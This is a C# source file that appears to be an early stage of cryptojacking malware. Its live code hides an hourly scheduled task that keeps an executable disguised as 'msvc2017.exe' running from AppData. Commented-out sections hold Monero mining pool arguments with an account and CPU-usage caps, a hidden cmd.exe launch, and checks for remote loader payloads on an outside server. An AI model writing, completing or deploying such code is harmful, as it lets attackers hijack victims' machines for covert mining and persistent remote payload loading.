using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;

namespace test
{
    class Program
    {
        public static String loader = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msvc2017.exe";
        static void Main(string[] args)
        {



            Process.Start(new ProcessStartInfo
            {
                Arguments = ("/create /tn EveryHour /tr " + loader + " /sc hourly /ri 1 /f"),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = false,
                FileName = "schtasks"
            });

            /*
            string appdatapath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msvc2017.exe";
            string mainpath = Process.GetCurrentProcess().MainModule.FileName;

           if (appdatapath == mainpath)
            {
                Console.WriteLine("Файл в эппдате");
                Console.ReadLine();
            }
           else
            {
                Console.WriteLine("Нихуя он не в эппдате");
                Console.ReadLine();
            }

            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msvc2017.exe");
            // Console.WriteLine(Process.GetCurrentProcess().MainModule.FileName);
            */


            /*
            string idlearg = "-o stratum+tcp://xmr.pool.minergate.com:45560 -u avtoritet1337@gmail.com -p x -k --max-cpu-usage=90";
            string noidlearg = "-o stratum+tcp://xmr.pool.minergate.com:45560 -u avtoritet1337@gmail.com -p x -k --max-cpu-usage=50";



            Process.Start(new ProcessStartInfo
            {
                Arguments = ("/K" + loaded_file),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            */

            //if (CheckFileServer("https://qubiq.xyz/loaderDaily.exe"))
            //{
            //    Console.WriteLine("File 1 succes found");
            //}
            //else
            //{
            //    Console.WriteLine("File 1 not found");
            //}

            //if (CheckFileServer("https://qubiq.xyz/loader.txt"))
            //{
            //    Console.WriteLine("File 2 succes found");
            //}
            //else
            //{
            //    Console.WriteLine("File 2 not found");
            //}

        }

        
//public static bool CheckFileServer(string Url)
//        {
//            WebRequest request = WebRequest.Create(Url);
//            request.Method = "HEAD";

//            try
//            {
//                using (var response = request.GetResponse())
//                    return ((HttpWebResponse)response).StatusCode == HttpStatusCode.OK;
              
//            }
//            catch (WebException)
//            {
               
//                return false;
//            }
//        }
    }
}
